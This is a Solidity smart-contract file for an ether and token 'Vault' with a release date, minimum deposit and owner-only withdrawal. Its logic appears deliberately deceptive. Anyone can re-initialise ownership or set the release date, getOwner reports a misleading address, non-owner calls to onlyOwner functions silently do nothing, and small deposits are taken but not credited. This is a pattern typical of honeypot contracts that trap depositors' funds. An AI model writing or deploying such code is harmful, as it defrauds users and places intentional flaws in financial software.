// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
// https://www.gnu.org/licenses/gpl-2.0.html

pragma solidity ^0.4.17;

// minimum token interface
contract Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint amount) public returns (bool);
}

contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}

// tokens are withdrawable
contract TokenVault is Ownable {
    address self = address(this);

    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
    
    function withdrawToken(address token) public returns (bool) {
        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
    }
    
    function emtpyTo(address token, address to) public returns (bool) {
        return withdrawTokenTo(token, to, Token(token).balanceOf(self));
    }
}

// store ether & tokens for a period of time
contract Vault is TokenVault {
    
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);

    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;

    function initVault() payable open {
        Owner = msg.sender;
        minDeposit = 0.25 ether;
        Locked = false;
        deposit();
    }
    
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }

    function() public payable { deposit(); }

    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }

    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }

    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }

    function lock() public { Locked = true; } address inited;
    modifier open { if (!Locked) _; inited = msg.sender; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return inited; }
}